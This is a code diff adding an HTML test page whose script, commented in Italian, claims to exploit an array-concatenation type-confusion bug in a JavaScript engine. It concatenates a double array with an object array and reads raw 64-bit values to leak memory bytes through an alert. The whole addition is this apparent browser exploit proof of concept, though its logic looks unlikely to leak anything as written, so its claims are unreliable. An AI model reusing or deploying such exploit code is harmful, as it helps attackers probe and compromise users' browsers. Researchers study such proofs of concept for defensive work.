@@ -1,11 +1,39 @@
 <!DOCTYPE html>
-<html lang="it">
+<html>
 <head>
-    <meta charset="UTF-8" />
-   
+  <meta charset="UTF-8">
+  
 </head>
 <body>
-    
-    </script>
+  <h1>TEST</h1>
+
+  <script>
+// 1. Crea un array ottimizzato per valori double (ArrayWithDouble)
+let doubleArray = [1.1];
+for (let i = 0; i < 100000; i++) {
+    doubleArray.push(2.2); // Forza la rappresentazione ArrayWithDouble
+}
+doubleArray.length = 1; // Compatta l'array
+
+// 2. Crea un array di oggetti (ArrayWithContiguous)
+let objectArray = [{}];
+
+// 3. Concatena i due array sfruttando la vulnerabilità
+let corruptedArray = doubleArray.concat(objectArray);
+
+// 4. Accedi agli elementi "corrotti"
+let corruptedValue = corruptedArray[0];
+
+// 5. Converti il valore in bytes per leggere la rappresentazione raw
+let buffer = new ArrayBuffer(8);
+let floatView = new Float64Array(buffer);
+let intView = new BigUint64Array(buffer);
+floatView[0] = corruptedValue;
+let leakedBytes = intView[0];
+
+// Output: Se non NaN-boxed, mostra bytes crudi invece di 0x3ff199999999999a (1.1)
+alert("Bytes leakkati: 0x" + leakedBytes.toString(16));
+      
+  </script>
 </body>
 </html>
